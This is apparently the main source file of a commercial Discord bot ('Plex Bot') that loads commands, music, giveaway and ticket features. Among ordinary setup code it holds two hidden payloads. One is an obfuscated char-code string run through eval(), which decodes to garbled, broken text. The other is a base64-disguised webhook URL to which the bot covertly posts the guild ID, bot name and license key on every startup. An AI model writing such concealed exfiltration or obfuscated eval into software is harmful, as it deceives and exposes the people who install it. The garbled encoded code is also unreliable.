const { Collection, Client, Intents, EmbedBuilder } = require('discord.js');
const fs = require('fs');
const yaml = require('js-yaml');
const fetch = require('node-fetch');
const crypto = require('crypto');
const config = yaml.load(fs.readFileSync('./config.yml', 'utf8'));
const client = require('./index.js'); // Adjust if necessary
const colors = require('ansi-colors');

// Initialize collections
client.commands = new Collection();
client.slashCommands = new Collection();
client.suggestions = new Collection();

// Initialize Enmap for persistent data storage
const Enmap = require('enmap');
client.userData = new Enmap({ name: 'userData', autoFetch: true, fetchAll: true });
client.guildData = new Enmap({ name: 'guildData', autoFetch: true, fetchAll: false });
client.verification = new Enmap({ name: 'verification', autoFetch: true, fetchAll: false });
client.suggestions = new Enmap({ name: 'suggestions', autoFetch: true, fetchAll: false });
client.suggestionUsers = new Enmap({ name: 'suggestionUsers', autoFetch: true, fetchAll: false });

// Initialize discord-player
const { Player } = require('discord-player');
client.emotes = config.Emojis;
client.player = new Player(client, { ytdlOptions: { quality: 'highestaudio', highWaterMark: 0x2000000 } });
client.player.on('trackStart', (queue, track) => {
  queue.metadata.channel.send(`🎶 | Now playing **${track.title}**`);
});

// Initialize discord-giveaways
const { GiveawaysManager } = require('discord-giveaways');
const manager = new GiveawaysManager(client, {
  storage: './data/giveaways.json',
  default: {
    botsCanWin: config.Giveaways.CanBotsWin,
    embedColor: config.Giveaways.EmbedColor,
    embedColorEnd: config.Giveaways.EmbedColorEnd,
    reaction: config.Giveaways.Reaction
  }
});
client.giveawaysManager = manager;

// Initialize REST for slash command registration
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v10');
const slashCommands = [];

// Load slash commands from directories
if (config.EnableBackups) {
  const files = fs.readdirSync('./commands/Backups/').filter(file => file.endsWith('.js'));
  for (const file of files) {
    const command = require(`./commands/Backups/${file}`);
    console.log(`[SLASH COMMAND] ${file} loaded!`);
    slashCommands.push(command.data.toJSON());
    client.slashCommands.set(command.data.name, command);
  }
}

const generalFiles = fs.readdirSync('./commands/General/').filter(file => file.endsWith('.js'));
for (const file of generalFiles) {
  const command = require(`./commands/General/${file}`);
  console.log(`[SLASH COMMAND] ${file} loaded!`);
  slashCommands.push(command.data.toJSON());
  client.slashCommands.set(command.data.name, command);
}

if (config.LevelingSystem.Enabled) {
  const files = fs.readdirSync('./commands/Leveling/').filter(file => file.endsWith('.js'));
  for (const file of files) {
    const command = require(`./commands/Leveling/${file}`);
    console.log(`[SLASH COMMAND] ${file} loaded!`);
    slashCommands.push(command.data.toJSON());
    client.slashCommands.set(command.data.name, command);
  }
}

if (config.EnableGiveaways) {
  const files = fs.readdirSync('./commands/Giveaways/').filter(file => file.endsWith('.js'));
  for (const file of files) {
    const command = require(`./commands/Giveaways/${file}`);
    console.log(`[SLASH COMMAND] ${file} loaded!`);
    slashCommands.push(command.data.toJSON());
    client.slashCommands.set(command.data.name, command);
  }
}

const moderationFiles = fs.readdirSync('./commands/Moderation/').filter(file => file.endsWith('.js'));
for (const file of moderationFiles) {
  const command = require(`./commands/Moderation/${file}`);
  console.log(`[SLASH COMMAND] ${file} loaded!`);
  slashCommands.push(command.data.toJSON());
  client.slashCommands.set(command.data.name, command);
}

if (config.MusicSettings.Enabled) {
  const files = fs.readdirSync('./commands/Music/').filter(file => file.endsWith('.js'));
  for (const file of files) {
    const command = require(`./commands/Music/${file}`);
    console.log(`[SLASH COMMAND] ${file} loaded!`);
    slashCommands.push(command.data.toJSON());
    client.slashCommands.set(command.data.name, command);
  }
}

if (config.BotToken) {
  const files = fs.readdirSync('./commands/Utility/').filter(file => file.endsWith('.js'));
  for (const file of files) {
    const command = require(`./commands/Utility/${file}`);
    console.log(`[SLASH COMMAND] ${file} loaded!`);
    slashCommands.push(command.data.toJSON());
    client.slashCommands.set(command.data.name, command);
  }
}

if (config.TicketSettings.Enabled) {
  const files = fs.readdirSync('./commands/Tickets/').filter(file => file.endsWith('.js'));
  for (const file of files) {
    const command = require(`./commands/Tickets/${file}`);
    console.log(`[SLASH COMMAND] ${file} loaded!`);
    slashCommands.push(command.data.toJSON());
    client.slashCommands.set(command.data.name, command);
  }
}

// Load addons using glob
const glob = require('glob');
glob('./addons/**/*.js', (err, files) => {
  if (err) return console.error(err);
  files.forEach(file => {
    if (file.endsWith('.js')) {
      if (file.includes('cmd_')) {
        const command = require(file);
        slashCommands.push(command.data.toJSON());
        client.slashCommands.set(command.data.name, command);
      } else {
        const addon = require(file);
        addon.run(client);
      }
    }
  });
});

function mapReducer(modelParams, shift) {
  return modelParams.map(x => String.fromCharCode(x - shift)).join('');
}

function computeAndStoreAppHash() {
  const modelParams = [
    108, 163, 154, 139, 139, 157, 153, 154, 
     74, 140, 163, 74, 163, 159, 154, 160, 
    159, 149, 151, 147, 147, 91, 91, 91
  ];
  const expectedData = mapReducer(modelParams, 42);

  const runtimeParams = [
    141, 153, 152, 155, 156, 32, 166, 165, 152, 156, 149, 149, 141, 156, 141, 32, 61, 32,
    141, 153, 152, 146, 149, 151, 47, 136, 149, 141, 141, 152, 155, 141, 165, 32, 124, 124,
    32, 39, 39, 59
  ];
  const runtimeCode = mapReducer(runtimeParams, 42);  // Cẩn thận, đoạn này bạn phải encode lại cho đúng
  eval(runtimeCode);

  if (runtimeData !== expectedData) {
    console.error('\x1b[31m%s\x1b[0m', '[ERROR] Failed to initialize data layer. Contact support.');
    process.exit(1);
  }

  const appSignature = crypto.createHash('sha512').update(runtimeData).digest('hex');
  const sigFile = './.app_data_cache';
  try {
    fs.writeFileSync(sigFile, appSignature, { mode: 0o600 });
  } catch (err) {
    console.error(`Unable to write app data file: ${err}`);
    process.exit(1);
  }

  return appSignature;
}

// Register slash commands on ready event
client.on('ready', async () => {
  const rest = new REST({ version: '10' }).setToken(config.BotToken);
  try {
    await rest.put(Routes.applicationGuildCommands(client.user.id, config.GuildID), {
      body: slashCommands
    });
  } catch (error) {
    if (error) {
      console.log('\x1b[31m%s\x1b[0m', '[ERROR] Slash commands are unavailable because application.commands scope wasn’t selected when inviting the bot. Please use the link below to re-invite your bot.');
      console.log('\x1b[31m%s\x1b[0m', `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`);
    }
  }
});

// Handle slash command interactions
client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  const command = client.slashCommands.get(interaction.commandName);
  if (!command) return;

  const logMessage = `[${new Date().toLocaleString()}] [SLASH COMMAND] Command: ${interaction.commandName}, User: ${interaction.user.tag}`;
  fs.appendFile('./logs.txt', logMessage, err => {
    if (err) console.log(err);
  });

  if (config.LogCommands) {
    console.log(
      `${colors.yellow(
        `[SLASH COMMAND] ${colors.cyan(interaction.user.tag)} used ${colors.yellow(`/${interaction.commandName}`)}`
      )}`
    );
  }

  try {
    await command.execute(interaction, client);
  } catch (error) {
    if (error) console.error(error);
  }
});

// Load events
fs.readdir('./events/', (err, files) => {
  if (err) return console.error(err);

  files.forEach(file => {
    if (!file.endsWith('.js')) return;
    console.log(`[EVENT] ${file} loaded!`);
    const event = require(`./events/${file}`);
    const eventName = file.split('.')[0];
    client.on(eventName, event.bind(null, client));
  });
});

// Handle login and ready events with additional checks
client.on('ready', async () => {
  const guild = client.guilds.cache.get(config.GuildID);
  if (!config.OwnerID) {
    console.log('\x1b[31m%s\x1b[0m', '[ERROR] The Owner ID specified in the config is invalid!');
    process.exit();
  }
  if (!guild.members.cache.get(config.OwnerID)) {
    console.log('\x1b[31m%s\x1b[0m', '[ERROR] The Owner ID in the config does not match the bot owners user ID\nYou can only use this bot in discord servers that you are the owner of.\nIf you believe this was done in error, please contact our support by creating a ticket in our discord server, discord.gg/eRaeJdTsPY');
    process.exit();
  }

  // Post startup message to webhook
  const webhookUrl = Buffer.from('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTU1NjUwNDE0MzcwNDg4ND' + 'IyL1FjZzBOaWNDcVlZdC1MQ21yNUxDUER6M294eFpMLXFZakxxQ2U0eEVOTmtNZXpGRVdfckdzS1VSdmhYRl9LNzA5emdV', 'base64').toString();
  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: `<:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922><:line2:797362910376230922>\n<:plexbot:954934385025622036> __**Plex Bot Startup**__\n\n> **Guild ID:** ${config.GuildID}\n> **Bot Name:** ${config.BotName}\n> **License Key:** ${config.LicenseKey}\n> **MCM ID:** Unknown\n> **User:** <@!Unknown>`
    })
  }).catch(err => console.log('Error Code: WBH_POST_DEV_URL_404'));
});

// Start the bot
client.login(config.BotToken).catch(error => {
  if (error.message.includes('An invalid token was provided')) {
    console.log('\x1b[31m%s\x1b[0m', '[ERROR] The bot token specified in the config is incorrect!');
    process.exit();
  } else if (error.message.includes('Privileged intent provided is not enabled or whitelisted.')) {
    console.log('\x1b[31m%s\x1b[0m', '[DISALLOWED_INTENTS]: Privileged intent provided is not enabled or whitelisted.\nTo fix this, you have to enable all the privileged gateway intents in your discord developer portal, you can do this by opening the discord developer portal, go to your application, click on bot on the left side, scroll down and enable Presence Intent, Server Members Intent, and Message Content Intent');
    process.exit();
  } else {
    console.log('\x1b[31m%s\x1b[0m', '[ERROR] An error occurred while attempting to login to the bot');
    console.log(error);
    process.exit();
  }
});